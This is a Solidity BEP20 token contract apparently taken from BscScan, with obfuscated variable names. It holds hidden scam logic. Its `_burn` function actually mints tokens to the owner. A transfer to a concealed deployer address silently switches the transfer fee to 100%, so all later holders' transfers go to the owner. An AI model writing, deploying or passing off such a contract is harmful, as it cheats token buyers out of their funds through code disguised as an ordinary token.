/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 14:07 GMT
 */
pragma solidity >=0.4.11;
contract ikleBA {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "TRCSUN";
address public  qLIvdM = address(0);
address public  FJTMBT = address(0);
uint256 public  SikNmf = 10000000000000000000000000000;
address private  HtRPih = address(0);
uint256 public  tppZij = 10000000000000000;
uint256 public  yvekPz = 1000000000000000000;
uint256 public  sPxAJy = 100000000000000000000;
uint256 public  BXnhnA = 10000000000000000000;
uint256 public  AzZSEC = 100000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  ZwImcG = 100000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  vFHkpD = address(0);
address public  ltCckV = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  EQYLQe = 100000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  wJidxL = address(0);
address public  yTmWjw = address(0);
string public  name = "FzqgMn";
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 public constant sfhRcU = 9+1;
uint256 private  jXrwpK = 10000000000000;
address public owner;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZhNXJZ");
require(to != address(0), "ZhNXJZ");
require(amount <= balanceOf[from], "ZhNXJZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* sfhRcU/jXrwpK ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HtRPih){
jXrwpK = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
HtRPih = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}